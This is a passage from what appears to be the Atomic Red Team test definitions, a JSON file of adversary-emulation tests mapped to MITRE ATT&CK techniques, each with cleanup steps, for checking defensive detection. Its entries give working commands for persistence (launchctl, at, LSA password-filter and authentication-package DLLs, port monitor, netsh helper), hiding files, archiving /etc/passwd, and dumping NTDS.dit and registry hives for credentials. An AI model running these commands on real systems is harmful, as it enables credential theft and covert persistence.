				"prereq_command": "if [ -f \"#{exe_path}\" ]; then exit 0 ; else exit 1; fi\n",
				"get_prereq_command": "cc #{objc_source_path} -o #{exe_path} -framework Cocoa\n"
			}
		],
		"executor": {
			"command": "FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then echo \"No loginwindow plist file found\" && exit 1 ; fi\necho save backup copy to /tmp/\ncp ${FILE} /tmp/t1547007_loginwindow-backup.plist\necho before\nplutil -p ${FILE}\necho overwriting...\n#{exe_path} ${FILE} && echo after && plutil -p ${FILE}\n",
			"cleanup_command": "rm -f #{exe_path}\n# revert to backup copy\nFILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`\nif [ -z \"${FILE}\" ] ; then\n   exit 0\nfi\nmv /tmp/t1547007_loginwindow-backup.plist ${FILE}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1547.007",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Launchctl",
		"auto_generated_guid": "6fb61988-724e-4755-a595-07743749d4e2",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"executable_path": {
				"description": "Path of the executable to run.",
				"type": "path",
				"default": "/System/Applications/Calculator.app/Contents/MacOS/Calculator"
			},
			"label_name": {
				"description": "Unique label to assign this job to launchd.",
				"type": "string",
				"default": "evil"
			}
		},
		"executor": {
			"command": "launchctl submit -l #{label_name} -- #{executable_path}\n",
			"cleanup_command": "launchctl remove #{label_name}\n",
			"name": "bash",
			"elevation_required": false
		},
		"attack_technique": "T1569.001",
		"phases": ["execution"]
	},
	{
		"name": "At.exe Scheduled task",
		"auto_generated_guid": "4a6c0dc4-0f2a-4203-9298-a5a9bdc21ed8",
		"supported_platforms": ["windows"],
		"executor": {
			"name": "command_prompt",
			"elevation_required": false,
			"command": "at 13:20 /interactive cmd\n"
		},
		"attack_technique": "T1053.002",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "At - Schedule a job",
		"auto_generated_guid": "7266d898-ac82-4ec0-97c7-436075d0d08e",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"time_spec": {
				"description": "Time specification of when the command should run",
				"type": "string",
				"default": "now + 1 minute"
			},
			"at_command": {
				"description": "The command to be run",
				"type": "string",
				"default": "echo Hello from Atomic Red Team"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "The `at` and `atd` executables must exist in the PATH\n",
				"prereq_command": "if [ \"$(uname)\" = 'FreeBSD' ]; then which at; else which at && which atd; fi;\n",
				"get_prereq_command": "echo 'Please install `at` and `atd`; they were not found in the PATH (Package name: `at`)'\n"
			},
			{
				"description": "The `atd` daemon must be running\n",
				"prereq_command": "if [ $(uname) = 'Linux' ]; then systemctl status atd || service atd status; fi;\n",
				"get_prereq_command": "echo 'Please start the `atd` daemon (sysv: `service atd start` ; systemd: `systemctl start atd`)'\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "echo \"#{at_command}\" | at #{time_spec}"
		},
		"attack_technique": "T1053.002",
		"phases": ["execution", "persistence", "privilege-escalation"]
	},
	{
		"name": "Create a hidden file in a hidden directory",
		"auto_generated_guid": "61a782e5-9a19-40b5-8ba4-69a4b9f3d7be",
		"supported_platforms": ["linux", "macos"],
		"executor": {
			"command": "mkdir /var/tmp/.hidden-directory\necho \"T1564.001\" > /var/tmp/.hidden-directory/.hidden-file\n",
			"cleanup_command": "rm -rf /var/tmp/.hidden-directory/\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Mac Hidden file",
		"auto_generated_guid": "cddb9098-3b47-4e01-9d3b-6f5f323288a9",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Windows System File with Attrib",
		"auto_generated_guid": "f70974c8-c094-4574-b542-2c545af95a32",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_modify": {
				"description": "File to modify using Attrib command",
				"type": "string",
				"default": "%temp%\\T1564.001.txt"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file must exist on disk at specified location (#{file_to_modify})\n",
				"prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"
			}
		],
		"executor": {
			"command": "attrib.exe +s #{file_to_modify}\n",
			"cleanup_command": "del /A:S #{file_to_modify} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Windows Hidden File with Attrib",
		"auto_generated_guid": "dadb792e-4358-4d8d-9207-b771faa0daa5",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_modify": {
				"description": "File to modify using Attrib command",
				"type": "string",
				"default": "%temp%\\T1564.001.txt"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file must exist on disk at specified location (#{file_to_modify})\n",
				"prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "echo system_Attrib_T1564.001 >> #{file_to_modify}\n"
			}
		],
		"executor": {
			"command": "attrib.exe +h #{file_to_modify}\n",
			"cleanup_command": "del /A:H #{file_to_modify} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hidden files",
		"auto_generated_guid": "3b7015f2-3144-4205-b799-b05580621379",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"filename": {
				"description": "path of file to hide",
				"type": "path",
				"default": "/tmp/evil"
			}
		},
		"executor": {
			"command": "setfile -a V #{filename}\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hide a Directory",
		"auto_generated_guid": "b115ecaf-3b24-4ed2-aefe-2fcb9db913d3",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "touch /var/tmp/T1564.001_mac.txt\nchflags hidden /var/tmp/T1564.001_mac.txt\n",
			"cleanup_command": "rm /var/tmp/T1564.001_mac.txt\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Show all hidden files",
		"auto_generated_guid": "9a1ec7da-b892-449f-ad68-67066d04380c",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "defaults write com.apple.finder AppleShowAllFiles YES\n",
			"cleanup_command": "defaults write com.apple.finder AppleShowAllFiles NO\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Hide Files Through Registry",
		"auto_generated_guid": "f650456b-bd49-4bc1-ae9d-271b5b9581e7",
		"supported_platforms": ["windows"],
		"executor": {
			"command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v Hidden /t REG_DWORD /d 0 /f\n",
			"cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v ShowSuperHidden /f >nul 2>&1\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v Hidden /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Windows Hidden File with powershell",
		"auto_generated_guid": "7f66d539-4fbe-4cfa-9a56-4a2bf660c58a",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_modify": {
				"description": "File to modify",
				"type": "string",
				"default": "%temp%\\T1564.001-9.txt"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file must exist on disk at specified location (#{file_to_modify})\n",
				"prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "echo system_Attrib_T1564.001-9 >> #{file_to_modify}\n"
			}
		],
		"executor": {
			"command": "$file = Get-Item $env:temp\\T1564.001-9.txt -Force\n$file.attributes='Hidden'\n",
			"cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Create Windows System File with powershell",
		"auto_generated_guid": "d380c318-0b34-45cb-9dad-828c11891e43",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"file_to_modify": {
				"description": "File to modify",
				"type": "string",
				"default": "%temp%\\T1564.001-10.txt"
			}
		},
		"dependency_executor_name": "command_prompt",
		"dependencies": [
			{
				"description": "The file must exist on disk at specified location (#{file_to_modify})\n",
				"prereq_command": "IF EXIST #{file_to_modify} ( EXIT 0 ) ELSE ( EXIT 1 )\n",
				"get_prereq_command": "echo system_Attrib_T1564.001-10 >> #{file_to_modify}\n"
			}
		],
		"executor": {
			"command": "$file = Get-Item $env:temp\\T1564.001-10.txt -Force\n$file.attributes='System'\n",
			"cleanup_command": "cmd /c 'del /A:H #{file_to_modify} >nul 2>&1'\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1564.001",
		"phases": ["defense-evasion"]
	},
	{
		"name": "Docker Container and Resource Discovery",
		"auto_generated_guid": "ea2255df-d781-493b-9693-ac328f9afc3f",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify Docker is installed.",
				"prereq_command": "which docker\n",
				"get_prereq_command": "if [ \"\" == \"`which docker`\" ]; then echo \"Docker Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install docker ; elif [ -n \"`which yum`\" ]; then sudo yum -y install docker ; fi ; else echo \"Docker installed\"; fi\n"
			},
			{
				"description": "Verify Docker service is running.",
				"prereq_command": "sudo systemctl status docker --no-pager\n",
				"get_prereq_command": "sudo systemctl start docker \n"
			}
		],
		"executor": {
			"command": "docker build -t t1613 $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)",
			"cleanup_command": "docker stop t1613_container\ndocker rmi -f t1613_container",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1613",
		"phases": ["discovery"]
	},
	{
		"name": "Podman Container and Resource Discovery",
		"auto_generated_guid": "fc631702-3f03-4f2b-8d8a-6b3d055580a1",
		"supported_platforms": ["containers"],
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Verify Podman is installed.",
				"prereq_command": "which podman\n",
				"get_prereq_command": "if [ \"\" == \"`which podman`\" ]; then echo \"Podman Not Found\"; if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install podman ; elif [ -n \"`which yum`\" ]; then sudo yum -y install podman ; elif [ -n \"`which pacman`\" ]; then sudo pacman -Sy podman --noconfirm ; elif [ -n \"`which brew`\" ]; then brew install podman ; else echo \"Unsupported package manager\"; fi ; else echo \"Podman installed\"; fi        \n"
			},
			{
				"description": "Verify Podman service is running.",
				"prereq_command": "sudo systemctl status podman --no-pager\n",
				"get_prereq_command": "sudo systemctl start podman \n"
			}
		],
		"executor": {
			"command": "podman build -t t1613 $PathtoAtomicsFolder/T1613/src/\npodman run --name t1613_container -d -t t1613\npodman ps\npodman stats --no-stream\npodman inspect $(podman ps -l -q --filter ancestor=t1613)",
			"cleanup_command": "podman stop t1613_container\npodman rmi -f t1613_container",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1613",
		"phases": ["discovery"]
	},
	{
		"name": "Install and Register Password Filter DLL",
		"auto_generated_guid": "a7961770-beb5-4134-9674-83d7e1fa865c",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_path": {
				"description": "Path to DLL to be installed and registered",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1556.002\\bin"
			},
			"dll_name": {
				"description": "Name of the Password Filter",
				"type": "string",
				"default": "AtomicRedTeamPWFilter.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
				"prereq_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"
			}
		],
		"executor": {
			"command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\n",
			"cleanup_command": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1556.002",
		"phases": ["credential-access", "defense-evasion", "persistence"]
	},
	{
		"name": "Install Additional Authentication Packages",
		"auto_generated_guid": "91580da6-bc6e-431b-8b88-ac77180005f2",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"dll_path": {
				"description": "Path to DLL to be installed and registered as additional authentication package",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1556.002\\bin"
			},
			"dll_name": {
				"description": "Name of the Password Filter",
				"type": "string",
				"default": "AtomicRedTeamPWFilter.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "AtomicRedTeamPWFilter.dll must exist on disk at specified location (#{dll_path}\\#{dll_name})\n",
				"prereq_command": "if (Test-Path \"#{dll_path}\\#{dll_name}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/redcanaryco/atomicredteam/atomics/T1556.002/bin/AtomicRedTeamPWFilter.dll\" -OutFile \"#{dll_path}\\#{dll_name}\"\n"
			}
		],
		"executor": {
			"command": "reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\n$passwordFilterName = (Copy-Item \"#{dll_path}\\#{dll_name}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$AuthenticationPackagesValues = $lsaKey.GetValue(\"Authentication Packages\")\n$AuthenticationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Authentication Packages\" $AuthenticationPackagesValues\n",
			"cleanup_command": "reg.exe import \"PathToAtomicsFolder\\T1556.002\\lsa_backup.reg\"\nremove-item C:\\Windows\\System32\\#{dll_name}\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1556.002",
		"phases": ["credential-access", "defense-evasion", "persistence"]
	},
	{
		"name": "Add Port Monitor persistence in Registry",
		"auto_generated_guid": "d34ef297-f178-4462-871e-9ce618d44e50",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"monitor_dll": {
				"description": "Addition to port monitor registry key. Normally refers to a DLL name in C:\\Windows\\System32 but an arbitrary DLL can be specified with the absolute path.",
				"type": "path",
				"default": "$PathToAtomicsFolder\\T1547.010\\bin\\PortMonitor.dll"
			}
		},
		"executor": {
			"command": "reg add \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /v \"Driver\" /d \"#{monitor_dll}\" /t REG_SZ /f\n",
			"cleanup_command": "reg delete \"hklm\\system\\currentcontrolset\\control\\print\\monitors\\AtomicRedTeam\" /f >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1547.010",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Netsh Helper DLL Registration",
		"auto_generated_guid": "3244697d-5a3a-4dfc-941c-550f69f91a4d",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"helper_file": {
				"description": "Path to DLL",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1546.007\\bin\\NetshHelper.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Helper DLL must exist on disk at specified location (#{helper_file})\n",
				"prereq_command": "if (Test-Path \"#{helper_file}\") { exit 0} else { exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{helper_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.007/bin/NetshHelper.dll\" -OutFile \"#{helper_file}\"\n"
			}
		],
		"executor": {
			"command": "netsh.exe add helper \"#{helper_file}\"\ntaskkill /im notepad.exe /t /f > NUL 2>&1\n",
			"cleanup_command": "netsh.exe delete helper \"#{helper_file}\"\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.007",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Compressing data using GZip in Python (FreeBSD/Linux)",
		"auto_generated_guid": "391f5298-b12d-4636-8482-35d9c17d53a8",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_input_file": {
				"description": "Path to the file that you want to compress",
				"type": "path",
				"default": "/etc/passwd"
			},
			"path_to_output_file": {
				"description": "Path of the file that you want your .gz file to be",
				"type": "path",
				"default": "/tmp/passwd.gz"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which python || which python3\n",
				"get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n",
			"cleanup_command": "rm #{path_to_output_file}\n"
		},
		"attack_technique": "T1560.002",
		"phases": ["collection"]
	},
	{
		"name": "Compressing data using bz2 in Python (FreeBSD/Linux)",
		"auto_generated_guid": "c75612b2-9de0-4d7c-879c-10d7b077072d",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_input_file": {
				"description": "Path to the file that you want to compress",
				"type": "path",
				"default": "/etc/passwd"
			},
			"path_to_output_file": {
				"description": "Path of the file that you want your .bz2 file to be",
				"type": "path",
				"default": "/tmp/passwd.bz2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which python || which python3\n",
				"get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n",
			"cleanup_command": "rm #{path_to_output_file}\n"
		},
		"attack_technique": "T1560.002",
		"phases": ["collection"]
	},
	{
		"name": "Compressing data using zipfile in Python (FreeBSD/Linux)",
		"auto_generated_guid": "001a042b-859f-44d9-bf81-fd1c4e2200b0",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_input_file": {
				"description": "Path to the file that you want to compress",
				"type": "path",
				"default": "/etc/passwd"
			},
			"path_to_output_file": {
				"description": "Path of the file that you want your .zip file to be",
				"type": "path",
				"default": "/tmp/passwd.zip"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which python || which python3\n",
				"get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"\n",
			"cleanup_command": "rm #{path_to_output_file}\n"
		},
		"attack_technique": "T1560.002",
		"phases": ["collection"]
	},
	{
		"name": "Compressing data using tarfile in Python (FreeBSD/Linux)",
		"auto_generated_guid": "e86f1b4b-fcc1-4a2a-ae10-b49da01458db",
		"supported_platforms": ["linux"],
		"input_arguments": {
			"path_to_input_file": {
				"description": "Path to the file that you want to compress",
				"type": "path",
				"default": "/etc/passwd"
			},
			"path_to_output_file": {
				"description": "Path of the file that you want your .tar.gz file to be",
				"type": "path",
				"default": "/tmp/passwd.tar.gz"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires Python\n",
				"prereq_command": "which python || which python3\n",
				"get_prereq_command": "echo \"please install python to run this test\"; exit 1\n"
			}
		],
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\" \n",
			"cleanup_command": "rm #{path_to_output_file}\n"
		},
		"attack_technique": "T1560.002",
		"phases": ["collection"]
	},
	{
		"name": "AWS - EC2 Enumeration from Cloud Instance",
		"auto_generated_guid": "99ee161b-dcb1-4276-8ecb-7cfdcb207820",
		"supported_platforms": ["linux", "macos", "iaas:aws"],
		"input_arguments": {
			"stratus_path": {
				"description": "Path of stratus binary",
				"type": "path",
				"default": "$PathToAtomicsFolder/T1580/src"
			},
			"aws_region": {
				"description": "AWS region to detonate",
				"type": "string",
				"default": "us-west-2"
			}
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
				"prereq_command": "if test -f \"#{stratus_path}/stratus\"; then exit 0; else exit 1; fi\n",
				"get_prereq_command": "if [ \"$(uname)\" = \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi \n"
			},
			{
				"description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
				"prereq_command": "cat ~/.aws/credentials | grep \"default\"\n",
				"get_prereq_command": "echo \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n"
			}
		],
		"executor": {
			"command": "export AWS_REGION=#{aws_region}\ncd #{stratus_path}\necho \"Stratus: Start Warmup.\"\n./stratus warmup aws.discovery.ec2-enumerate-from-instance\necho \"Stratus: Start Detonate.\"\n./stratus detonate aws.discovery.ec2-enumerate-from-instance\n",
			"cleanup_command": "cd #{stratus_path}\necho \"Stratus: Start Cleanup.\"\n./stratus cleanup aws.discovery.ec2-enumerate-from-instance\necho \"Removing Stratus artifacts from local machine.\"\nrm -rf stratus*\n",
			"name": "sh",
			"elevation_required": false
		},
		"attack_technique": "T1580",
		"phases": ["discovery"]
	},
	{
		"name": "AWS - EC2 Security Group Enumeration",
		"auto_generated_guid": "99b38f24-5acc-4aa3-85e5-b7f97a5d37ac",
		"supported_platforms": ["iaas:aws"],
		"input_arguments": {
			"aws_profile": {
				"description": "AWS CLI profile name",
				"type": "string",
				"default": "default"
			},
			"output_format": {
				"description": "Desired output format (text, table, json)",
				"type": "string",
				"default": "json"
			}
		},
		"executor": {
			"name": "command_prompt",
			"command": "aws ec2 describe-security-groups --profile #{aws_profile} --output #{output_format}\n",
			"elevation_required": false
		},
		"dependencies": [
			{
				"description": "AWS CLI installed and configured with the necessary access rights.",
				"prereq_command": "type aws || aws --version",
				"get_prereq_command": "if [ \"$(uname)\" = \"Darwin\" ] || [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then\n  curl \"https://aws.amazon.com/cli/\" -o \"Install-AWSCLI.sh\" && sh Install-AWSCLI.sh\nelif [ \"$(expr substr $(uname) 1 5)\" = \"MINGW\" ]; then\n  Invoke-WebRequest -Uri \"https://aws.amazon.com/cli/\" -OutFile \"Install-AWSCLI.ps1\"; .\\Install-AWSCLI.ps1\nfi\n"
			},
			{
				"description": "Check if AWS CLI is installed and configured.",
				"prereq_command": "aws sts get-caller-identity --profile #{aws_profile}\n",
				"get_prereq_command": "if ! aws sts get-caller-identity --profile #{aws_profile}; then\n  echo \"AWS CLI not properly configured. Please configure AWS CLI.\"\nfi\n"
			}
		],
		"attack_technique": "T1580",
		"phases": ["discovery"]
	},
	{
		"name": "Create Volume Shadow Copy with vssadmin",
		"auto_generated_guid": "dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"drive_letter": {
				"description": "Drive letter to source VSC (including colon)",
				"type": "string",
				"default": "C:"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a Domain Controller\n",
				"prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
				"get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
			}
		],
		"executor": {
			"command": "vssadmin.exe create shadow /for=#{drive_letter}\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Copy NTDS.dit from Volume Shadow Copy",
		"auto_generated_guid": "c6237146-9ea6-4711-85c9-c56d263a6b03",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"vsc_name": {
				"description": "Name of Volume Shadow Copy",
				"type": "string",
				"default": "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
			},
			"extract_path": {
				"description": "Path for extracted NTDS.dit",
				"type": "path",
				"default": "C:\\Windows\\Temp"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a Domain Controller\n",
				"prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
				"get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
			},
			{
				"description": "Volume shadow copy must exist\n",
				"prereq_command": "if not exist #{vsc_name} (exit /b 1)\n",
				"get_prereq_command": "echo Run \"Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'\" to fulfill this requirement\n"
			},
			{
				"description": "Extract path must exist\n",
				"prereq_command": "if not exist #{extract_path} (exit /b 1)\n",
				"get_prereq_command": "mkdir #{extract_path}\n"
			}
		],
		"executor": {
			"command": "copy #{vsc_name}\\Windows\\NTDS\\NTDS.dit #{extract_path}\\ntds.dit\ncopy #{vsc_name}\\Windows\\System32\\config\\SYSTEM #{extract_path}\\VSC_SYSTEM_HIVE\nreg save HKLM\\SYSTEM #{extract_path}\\SYSTEM_HIVE\n",
			"cleanup_command": "del \"#{extract_path}\\ntds.dit\"        >nul 2> nul\ndel \"#{extract_path}\\VSC_SYSTEM_HIVE\" >nul 2> nul\ndel \"#{extract_path}\\SYSTEM_HIVE\"     >nul 2> nul\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1003.003",
		"phases": ["credential-access"]
	},
	{
		"name": "Dump Active Directory Database with NTDSUtil",
		"auto_generated_guid": "2364e33d-ceab-4641-8468-bfb1d7cc2723",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"output_folder": {
				"description": "Path where resulting dump should be placed",
				"type": "path",
				"default": "C:\\Windows\\Temp\\ntds_T1003"
			}
		},
		"dependencies": [
			{
				"description": "Target must be a Domain Controller\n",
				"prereq_command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  /v ProductType | findstr LanmanNT\n",
				"get_prereq_command": "echo Sorry, Promoting this machine to a Domain Controller must be done manually\n"
			}
		],
		"executor": {
			"command": "mkdir #{output_folder}\nntdsutil \"ac i ntds\" \"ifm\" \"create full #{output_folder}\" q q\n",
			"cleanup_command": "rmdir /q /s #{output_folder} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
